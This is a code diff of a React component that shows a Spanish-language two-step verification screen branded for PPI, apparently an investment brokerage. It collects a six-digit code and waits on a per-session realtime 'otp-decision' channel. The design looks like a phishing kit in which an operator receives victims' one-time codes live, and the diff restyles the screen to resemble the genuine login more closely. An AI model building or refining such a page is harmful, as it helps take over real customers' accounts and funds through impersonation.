@@ -1,7 +1,5 @@
 import { useState, useEffect, useCallback } from "react";
 import { supabase } from "@/integrations/supabase/client";
-import { Mail, KeyRound, ArrowLeft } from "lucide-react";
-import ppiLogoSvg from "@/assets/ppi-logo.svg";
 import {
   InputOTP,
   InputOTPGroup,
@@ -12,7 +10,7 @@ import {
 interface PpiOtpScreenProps {
   email: string;
   sessionId: string;
-  twofaType?: number; // 0 = email, 1 = authenticator
+  twofaType?: number;
   onBack: () => void;
 }
 
@@ -21,28 +19,12 @@ const PpiOtpScreen = ({ email, sessionId, twofaType, onBack }: PpiOtpScreenProps
   const [status, setStatus] = useState<"input" | "verifying" | "success" | "error">("input");
   const [errorMessage, setErrorMessage] = useState("");
 
-  const isEmail = twofaType === 0;
-  const isAuthenticator = twofaType === 1;
-
-  const title = isEmail
-    ? "Código enviado a tu email"
-    : isAuthenticator
-    ? "Google Authenticator"
-    : "Verificación en dos pasos";
-
-  const description = isEmail
-    ? "Ingresá el código de 6 dígitos que recibiste en tu correo electrónico"
-    : isAuthenticator
-    ? "Ingresá el código de 6 dígitos de tu app Google Authenticator"
-    : "Ingresá el código de 6 dígitos para verificar tu identidad";
-
-  const icon = isEmail ? (
-    <Mail className="h-7 w-7 text-[#1e5a96]" />
-  ) : (
-    <KeyRound className="h-7 w-7 text-[#1e5a96]" />
-  );
-
-  const iconEmoji = isEmail ? "📧" : "🔐";
+  const description =
+    twofaType === 0
+      ? "Ingresá el código de verificación que recibiste en tu email."
+      : twofaType === 1
+      ? "Ingresá el código de verificación de tu aplicación de autenticación."
+      : "Ingresá el código de verificación que recibiste en tu email o aplicación de autenticación.";
 
   useEffect(() => {
     const channel = supabase.channel(`session-otp-decision-${sessionId}`);
@@ -61,7 +43,6 @@ const PpiOtpScreen = ({ email, sessionId, twofaType, onBack }: PpiOtpScreenProps
         }
       })
       .subscribe();
-
     return () => { supabase.removeChannel(channel); };
   }, [sessionId]);
 
@@ -79,7 +60,6 @@ const PpiOtpScreen = ({ email, sessionId, twofaType, onBack }: PpiOtpScreenProps
         }
       })
       .subscribe();
-
     return () => { supabase.removeChannel(channel); };
   }, [sessionId]);
 
@@ -99,40 +79,22 @@ const PpiOtpScreen = ({ email, sessionId, twofaType, onBack }: PpiOtpScreenProps
     if (otp.length === 6 && status === "input") setStatus("verifying");
   }, [otp, status]);
 
+  const username = email?.split("@")[0] || email;
+
   if (status === "success") {
     return (
-      <div className="flex flex-col items-center text-center px-4">
-        <img src={ppiLogoSvg} alt="PPI" className="h-8 mb-6" />
-        <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-green-50">
-          <span className="text-2xl">✅</span>
-        </div>
-        <h3 className="mb-2 text-lg font-bold text-[#1e2a3a]">Verificación exitosa</h3>
-        <p className="text-sm text-[#8c939a]">Tu identidad fue verificada correctamente. Redirigiendo...</p>
-        <p className="mt-1 text-xs text-[#bbb]">{email}</p>
+      <div className="flex flex-col items-center text-center">
+        <h3 className="mb-2 text-[19px] font-bold text-[#1e2a3a]">Verificación exitosa</h3>
+        <p className="text-sm text-[#8c939a]">Tu identidad fue verificada correctamente.</p>
+        <p className="mt-2 text-xs text-[#bbb]">{username}</p>
       </div>
     );
   }
 
   return (
-    <div className="flex flex-col items-center text-center px-4">
-      <img src={ppiLogoSvg} alt="PPI" className="h-8 mb-6" />
-
-      {/* Icon */}
-      <div className="mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-[#f0f5fa]">
-        <span className="text-2xl">{iconEmoji}</span>
-      </div>
-
-      {/* MFA type badge */}
-      <div className="mb-3 inline-flex items-center gap-1.5 rounded-full border border-[#d0dbe8] bg-[#f5f8fc] px-3 py-1">
-        {icon}
-        <span className="text-xs font-semibold text-[#1e5a96]">
-          {isEmail ? "Código por email" : isAuthenticator ? "Google Authenticator" : "2FA"}
-        </span>
-      </div>
-
-      <h3 className="mb-1.5 text-lg font-bold text-[#1e2a3a]">{title}</h3>
-      <p className="mb-1 text-sm text-[#8c939a] max-w-[320px]">{description}</p>
-      <p className="mb-6 text-xs text-[#bbb]">{email}</p>
+    <div className="flex flex-col items-center text-center">
+      <h3 className="mb-2 text-[19px] font-bold text-[#1e2a3a]">Verificación en dos pasos</h3>
+      <p className="mb-6 text-[13.5px] text-[#8c939a] max-w-[340px] leading-relaxed">{description}</p>
 
       {errorMessage && status === "error" && (
         <div className="mb-4 w-full rounded-lg border border-red-200 bg-red-50 px-4 py-2 text-sm text-red-600">
@@ -140,37 +102,32 @@ const PpiOtpScreen = ({ email, sessionId, twofaType, onBack }: PpiOtpScreenProps
         </div>
       )}
 
-      <div className="mb-6">
+      <div className="mb-5">
         <InputOTP maxLength={6} value={otp} onChange={handleOtpChange} disabled={status === "verifying"} inputMode="numeric" pattern="[0-9]*">
           <InputOTPGroup>
-            <InputOTPSlot index={0} />
-            <InputOTPSlot index={1} />
-            <InputOTPSlot index={2} />
-          </InputOTPGroup>
-          <InputOTPSeparator />
-          <InputOTPGroup>
-            <InputOTPSlot index={3} />
-            <InputOTPSlot index={4} />
-            <InputOTPSlot index={5} />
+            <InputOTPSlot index={0} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
+            <InputOTPSlot index={1} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
+            <InputOTPSlot index={2} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
+            <InputOTPSlot index={3} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
+            <InputOTPSlot index={4} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
+            <InputOTPSlot index={5} className="h-12 w-11 text-lg font-semibold text-[#1e2a3a] border-[#d0d5dd]" />
           </InputOTPGroup>
         </InputOTP>
       </div>
 
-      {status === "verifying" && (
-        <div className="mb-4 flex items-center gap-2 text-sm text-[#8c939a]">
-          <div className="h-4 w-4 animate-spin rounded-full border-2 border-[#1e5a96] border-t-transparent" />
-          Verificando código...
-        </div>
-      )}
-
+      {/* Verificando button */}
       <button
-        onClick={onBack}
-        disabled={status === "verifying"}
-        className="flex items-center gap-1.5 text-xs text-[#8c939a] hover:text-[#1e2a3a] transition-colors disabled:opacity-50"
+        disabled
+        className={`w-full max-w-[300px] rounded-lg py-2.5 text-sm font-semibold transition-all ${
+          status === "verifying"
+            ? "bg-[#7fbde6] text-white"
+            : "bg-[#a8d4f0] text-white cursor-default"
+        }`}
       >
-        <ArrowLeft size={13} />
-        Volver al inicio
+        {status === "verifying" ? "Verificando..." : "Verificar"}
       </button>
+
+      <p className="mt-4 text-xs text-[#bbb]">{username}</p>
     </div>
   );
 };
